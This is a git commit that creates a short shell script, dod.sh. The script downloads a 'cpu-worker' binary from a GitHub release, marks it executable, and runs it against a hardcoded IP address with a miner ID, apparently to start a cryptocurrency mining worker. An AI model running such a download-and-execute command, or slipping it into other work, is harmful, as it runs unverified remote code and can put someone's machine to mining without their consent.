f74f4a78530a6e4c7375282245d4e93bd7f7c7c2
mydodworkers <mydodworkers@gmail.com>
2024-11-04 22:56:29 +0530

    Create dod.sh

---
+++ dod.sh
@@ -0,0 +1,3 @@
+wget https://github.com/corpltd001/vs/releases/download/0.001/cpu-worker
+chmod +x cpu-worker
+./cpu-worker 18.234.157.209 --miner-id ho3pp-cjcyb-adqz6-6t6se-a2re5-3voph-5mkyk-vxcx6-gfnyw-mftg3-5ae
